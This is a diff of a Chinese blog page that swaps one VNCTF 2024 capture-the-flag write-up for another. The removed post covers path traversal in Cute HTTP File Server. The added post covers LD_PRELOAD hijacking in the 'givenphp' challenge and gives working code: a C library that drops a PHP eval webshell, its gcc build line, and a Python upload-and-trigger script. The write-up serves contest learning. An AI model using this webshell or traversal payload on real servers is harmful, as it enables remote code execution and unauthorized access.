@@ -11,7 +11,7 @@
 
   
   <title>
-    Cute HTTP File Server |
+    2024 vnctf givenphp |
     
     Blog
   </title>
@@ -25,24 +25,21 @@
   
 <link rel="stylesheet" href="/css/loader.css">
 
-  <meta name="description" content="Cute HTTP File Server2024 vnctf  CutePath抓包，是一个share目录   放包过程发现 这个filepath应该有问题   最开始去谷歌直接搜索题目,当然是什么都找不到了,然后去bing搜CutePath server然后就发现了Cute HTTP File Server,然后又回谷歌找了好久,在github一个项目的issues找到了他,虽然但是这样我还是">
+  <meta name="description" content="2024 vnctf givenphp前置知识LD_LIBRARY_PATH  是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&#x2F;lib ,&#x2F;user&#x2F;lib）  LD_PRELOAD 在 LD_PRELOAD 中指定的文件会在动态链接器按照固">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Cute HTTP File Server">
-<meta property="og:url" content="https://hanggerui88.github.io/2024/03/05/Cute-HTTP-File-Server/index.html">
+<meta property="og:title" content="2024 vnctf givenphp">
+<meta property="og:url" content="https://hanggerui88.github.io/2024/03/08/2024-vnctf-givenphp/index.html">
 <meta property="og:site_name" content="Blog">
-<meta property="og:description" content="Cute HTTP File Server2024 vnctf  CutePath抓包，是一个share目录   放包过程发现 这个filepath应该有问题   最开始去谷歌直接搜索题目,当然是什么都找不到了,然后去bing搜CutePath server然后就发现了Cute HTTP File Server,然后又回谷歌找了好久,在github一个项目的issues找到了他,虽然但是这样我还是">
+<meta property="og:description" content="2024 vnctf givenphp前置知识LD_LIBRARY_PATH  是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&#x2F;lib ,&#x2F;user&#x2F;lib）  LD_PRELOAD 在 LD_PRELOAD 中指定的文件会在动态链接器按照固">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.postimg.cc/MH5XB5D3/image.png">
-<meta property="og:image" content="https://i.postimg.cc/Bn5X0hTL/image.png">
-<meta property="og:image" content="https://i.postimg.cc/gjcsPMBG/image.png">
-<meta property="og:image" content="https://i.postimg.cc/zDTRFSvf/1.png">
-<meta property="og:image" content="https://i.postimg.cc/D0c0k64d/image.png">
-<meta property="article:published_time" content="2024-03-05T03:23:18.000Z">
-<meta property="article:modified_time" content="2024-03-07T03:24:16.204Z">
+<meta property="og:image" content="https://img2.imgtp.com/2024/03/08/GlWohA07.png">
+<meta property="og:image" content="https://i.ibb.co/rQKXBd1/2.png">
+<meta property="article:published_time" content="2024-03-08T12:53:54.000Z">
+<meta property="article:modified_time" content="2024-03-08T12:55:01.780Z">
 <meta property="article:author" content="hanggerui88">
-<meta property="article:tag" content="2024 vnctf CutePath">
+<meta property="article:tag" content="LD_LIBRARY劫持">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.postimg.cc/MH5XB5D3/image.png">
+<meta name="twitter:image" content="https://img2.imgtp.com/2024/03/08/GlWohA07.png">
   
     <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
   
@@ -164,7 +161,7 @@
 </div>
 <header id="header">
   
-    <img fetchpriority="high" src="/images/banner.jpg" alt="Cute HTTP File Server">
+    <img fetchpriority="high" src="/images/banner.jpg" alt="2024 vnctf givenphp">
   
   <div id="header-outer" class="outer">
     <div id="header-title" class="inner">
@@ -173,7 +170,7 @@
           
           
             <a href="/" id="logo">
-              <h1>Cute HTTP File Server</h1>
+              <h1>2024 vnctf givenphp</h1>
             </a>
           
         
@@ -190,12 +187,12 @@
 
         <div id="content" class="outer">
           
-          <section id="main"><article id="post-Cute-HTTP-File-Server" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-2024-vnctf-givenphp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     <div class="article-meta">
       <div class="article-date wow slideInLeft">
-  <a href="/2024/03/05/Cute-HTTP-File-Server/" class="article-date-link">
-    <time datetime="2024-03-05T03:23:18.000Z" itemprop="datePublished">2024-03-05</time>
+  <a href="/2024/03/08/2024-vnctf-givenphp/" class="article-date-link">
+    <time datetime="2024-03-08T12:53:54.000Z" itemprop="datePublished">2024-03-08</time>
   </a>
 </div>
 
@@ -207,43 +204,53 @@
 
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="Cute-HTTP-File-Server"><a href="#Cute-HTTP-File-Server" class="headerlink" title="Cute HTTP File Server"></a>Cute HTTP File Server</h1><h2 id="2024-vnctf-CutePath"><a href="#2024-vnctf-CutePath" class="headerlink" title="2024 vnctf  CutePath"></a>2024 vnctf  CutePath</h2><p>抓包，是一个share目录<img src="https://i.postimg.cc/MH5XB5D3/image.png" alt="img"> </p>
-<p> 放包过程发现<img src="https://i.postimg.cc/Bn5X0hTL/image.png" alt="img"></p>
-<p>这个filepath应该有问题</p>
-<p><img src="https://i.postimg.cc/gjcsPMBG/image.png" alt="img"></p>
-<blockquote>
-<p>最开始去谷歌直接搜索题目,当然是什么都找不到了,然后去bing搜<code>CutePath server</code>然后就发现了Cute HTTP File Server,然后又回谷歌找了好久,在github一个项目的issues找到了他,虽然但是这样我还是没做出来,哎</p>
-</blockquote>
-<p>是要根据重命名这个功能移动文件到share目录下,因为最开始抓包就是share目录,这个地方可以下载文件</p>
-<p><img src="https://i.postimg.cc/zDTRFSvf/1.png" alt="img"> </p>
-<p>接着回到首页,(正常的share目录是不能下载的),</p>
-<p>然后就看到了梦寐以求的flag</p>
-<p><img src="https://i.postimg.cc/D0c0k64d/image.png" alt="img"></p>
-<p>VNCTF{564e406840636b3156315f6764676d}</p>
-<p>[还有种思路：]( <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13730?time__1311=mqmxnQKCw40D9DBLPx2B3fH1ADBDWTwD&alichlgref=https://cn.bing.com/">VNCTF2024 writeup(含cve-2024-0603漏洞分析) - 先知社区 (aliyun.com)</a> )</p>
-<p> 修改路径为<code>/chfs/downloaddir/../../../../flag</code>就能够成功获取<code>flag</code>目录的所有内容,包括<code>flag</code> </p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知识点:</p>
-<p>Cute HTTP File Server存在几个漏洞,目录遍历、任意目录移动、任意文件移动、任意目录下载。 </p>
-<p>题目最开始给你一个文件下载漏洞,然后根据自己又发现的移动文件漏洞,下载flag</p>
-<blockquote>
-<p>穿插一个悲伤的事情：</p>
-<p>因为我在改报错，一个没注意就让两块钱的可乐升值到了53.5（哭）</p>
-<p>不仅如此，等我合上电脑，打算吃晚饭，发现自己手码的笔记没保存（大哭）</p>
-<p>等我整理好自己的心情，出门顺便看一眼消息，看到导员@群体成员的“上课不听课，期末会挂科”就是在说我（&#x2F;(ㄒoㄒ)&#x2F;~~）</p>
-<p>绷不住了</p>
-</blockquote>
+        <h1 id="2024-vnctf-givenphp"><a href="#2024-vnctf-givenphp" class="headerlink" title="2024 vnctf givenphp"></a>2024 vnctf givenphp</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>LD_LIBRARY_PATH </p>
+<p>是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&#x2F;lib ,&#x2F;user&#x2F;lib）</p>
+<p> LD_PRELOAD</p>
+<p>在 <code>LD_PRELOAD</code> 中指定的文件会在动态链接器按照固定规则搜索共享库之前装载，他比 <code>LD_LIBRARY_PATH</code> 所指定的目录中的共享库还要优先 </p>
+<p>共享库（如：动态库）搜索顺序如下：</p>
+<ol>
+<li><p>LD_PRELOAD 环境变量指定的共享库路径；</p>
+</li>
+<li><p>LD_LIBRARY_PATH 环境变量指定的共享库路径；</p>
+</li>
+<li><p>-rpath 链接时指定的共享库路径；</p>
+</li>
+<li><p>&#x2F;etc&#x2F;ld.so.conf 配置文件指定的共享库路径；</p>
+</li>
+<li><p>默认共享库路径，&#x2F;usr&#x2F;lib，lib</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;upload&#x27;]))&#123;</span><br><span class="line">    handleFileUpload($_FILES[&#x27;file&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;challenge&#x27;]))&#123;</span><br><span class="line">    waf();</span><br><span class="line">    $value=$_GET[&#x27;value&#x27;];</span><br><span class="line">    $key=$_GET[&#x27;key&#x27;];</span><br><span class="line">    $func=create_function(&quot;&quot;,&quot;putenv(&#x27;$key=$value&#x27;);&quot;);</span><br><span class="line">    if($func==$_GET[&#x27;guess&#x27;])&#123;</span><br><span class="line">        $func();</span><br><span class="line">        system(&quot;whoami&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function waf()</span><br><span class="line">&#123;</span><br><span class="line">    if(preg_match(&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;,$_GET[&#x27;key&#x27;])||preg_match(&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;,$_GET[&#x27;value&#x27;]))&#123;</span><br><span class="line">        die(&quot;evil input!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function handleFileUpload($file)</span><br><span class="line">&#123;</span><br><span class="line">    $uploadDirectory = &#x27;/tmp/&#x27;;</span><br><span class="line"></span><br><span class="line">    if ($file[&#x27;error&#x27;] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        echo &#x27;文件上传失败。&#x27;;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    $fileExtension = pathinfo($file[&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    $newFileName = uniqid(&#x27;uploaded_file_&#x27;, true) . &#x27;.&#x27; . $fileExtension;</span><br><span class="line">    $destination = $uploadDirectory . $newFileName;</span><br><span class="line">    if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $destination)) &#123;</span><br><span class="line">        echo $destination;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;文件移动失败。&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 题目有两个功能，一个是文件上传到&#x2F;tmp目录下，还有一个是环境变量修改</p>
+<p>根据本地测试，无论key和value是什么，$fun都是 <font color='red'>\x00lambda_1</font></p>
+<p><img src="https://img2.imgtp.com/2024/03/08/GlWohA07.png"></p>
+<p> 然后是LD劫持 </p>
+<p>1.c，把木马写到www目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int puts(const char *message) &#123;</span><br><span class="line">  printf(&quot;ok&quot;);</span><br><span class="line">  system(&quot;echo &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; &gt; /var/www/html/shell.php&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>kail执行命令生成1.so文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o 1.so 1.c -nostartfiles</span><br></pre></td></tr></table></figure>
+
+<p>python 发上传包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://6179e5b0-1ddf-43cc-8135-8796de783f38.vnctf2024.manqiu.top/&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;upload&quot;:1</span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    &quot;file&quot;:open(&#x27;1.so&#x27;,&#x27;rb&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,files=file)</span><br><span class="line"># print(r.text)</span><br><span class="line"></span><br><span class="line">value = r.text[-45:]</span><br><span class="line"></span><br><span class="line">param = &#123;</span><br><span class="line">    &quot;challenge&quot;:1,</span><br><span class="line">    &quot;key&quot;:&quot;LD_PRELOAD&quot;,</span><br><span class="line">    &quot;value&quot;:value,</span><br><span class="line">    &quot;guess&quot;:&#x27;\x00lambda_1&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url,params=param)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.ibb.co/rQKXBd1/2.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://hanggerui88.github.io/2024/03/05/Cute-HTTP-File-Server/" data-id="cltgo2a2p0001mshq286r0oas" data-title="Cute HTTP File Server" class="article-share-link">Share</a>
+      <a data-url="https://hanggerui88.github.io/2024/03/08/2024-vnctf-givenphp/" data-id="cltintt6i000068hqa5b5920m" data-title="2024 vnctf givenphp" class="article-share-link">Share</a>
       
       
       
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2024-vnctf-CutePath/" rel="tag">2024 vnctf CutePath</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LD-LIBRARY%E5%8A%AB%E6%8C%81/" rel="tag">LD_LIBRARY劫持</a></li></ul>
 
 
     </footer>
@@ -252,22 +259,22 @@
     
   <nav id="article-nav" class="wow fadeInUp">
     
-      <div class="article-nav-link-wrap article-nav-link-left">
-        
-          
-          
-            <img data-src="/images/banner.jpg" data-sizes="auto" alt="nss-calc" class="lazyload">
-          
-        
-        <a href="/2024/03/07/nss-calc/"></a>
-        <div class="article-nav-caption">Newer</div>
-        <h3 class="article-nav-title">
-          
-            nss-calc
-          
-        </h3>
-      </div>
     
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.jpg" data-sizes="auto" alt="nss-calc" class="lazyload">
+        
+      
+      <a href="/2024/03/07/nss-calc/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          nss-calc
+        
+      </h3>
+    </div>
     
   </nav>
 
@@ -287,7 +294,7 @@
     
       <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
-  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cute-HTTP-File-Server"><span class="toc-number">1.</span> <span class="toc-text">Cute HTTP File Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2024-vnctf-CutePath"><span class="toc-number">1.1.</span> <span class="toc-text">2024 vnctf  CutePath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024-vnctf-givenphp"><span class="toc-number">1.</span> <span class="toc-text">2024 vnctf givenphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.2.</span> <span class="toc-text">题目</span></a></li></ol></li></ol></div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -406,7 +413,7 @@
     
       <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
-  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cute-HTTP-File-Server"><span class="toc-number">1.</span> <span class="toc-text">Cute HTTP File Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2024-vnctf-CutePath"><span class="toc-number">1.1.</span> <span class="toc-text">2024 vnctf  CutePath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024-vnctf-givenphp"><span class="toc-number">1.</span> <span class="toc-text">2024 vnctf givenphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.2.</span> <span class="toc-text">题目</span></a></li></ol></li></ol></div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
